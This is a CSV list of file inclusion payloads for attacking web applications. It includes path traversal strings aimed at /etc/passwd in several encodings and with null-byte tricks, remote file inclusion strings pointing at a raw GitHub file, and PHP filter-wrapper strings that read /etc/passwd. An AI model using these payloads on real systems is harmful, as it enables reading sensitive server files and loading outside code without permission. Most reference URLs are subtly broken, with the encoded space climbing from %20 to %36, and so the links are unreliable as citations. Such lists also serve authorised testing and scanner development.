cve,tag,payload,url
,File Inclusion,../../../etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion 
,File Inclusion,../../../etc/passwd%00,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%21Inclusion
,File Inclusion,%252e%252e%252fetc%252fpasswd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%22Inclusion
,File Inclusion,%252e%252e%252fetc%252fpasswd%00,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%23Inclusion
,File Inclusion,%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%24Inclusion
,File Inclusion,%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%25Inclusion
,File Inclusion,....//....//etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%26Inclusion
,File Inclusion,..///////..////..//////etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%27Inclusion
,File Inclusion,/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%28Inclusion
,File Inclusion,https://raw.githubusercontent.com/dg2vy/sum-test/refs/heads/master/Makefile,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%29Inclusion
,File Inclusion,https://raw.githubusercontent.com/dg2vy/sum-test/refs/heads/master/Makefile%00,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%30Inclusion
,File Inclusion,https:%252f%252fraw.githubusercontent.com%252fdg2vy%252fsum-test%252frefs%252fheads%252fmaster%252fMakefile,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%31Inclusion
,File Inclusion,php://filter/read=string.rot13/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%32Inclusion
,File Inclusion,php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%33Inclusion
,File Inclusion,php://filter/convert.base64-encode/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%34Inclusion
,File Inclusion,pHp://FilTer/convert.base64-encode/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%35Inclusion
,File Inclusion,php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%36Inclusion
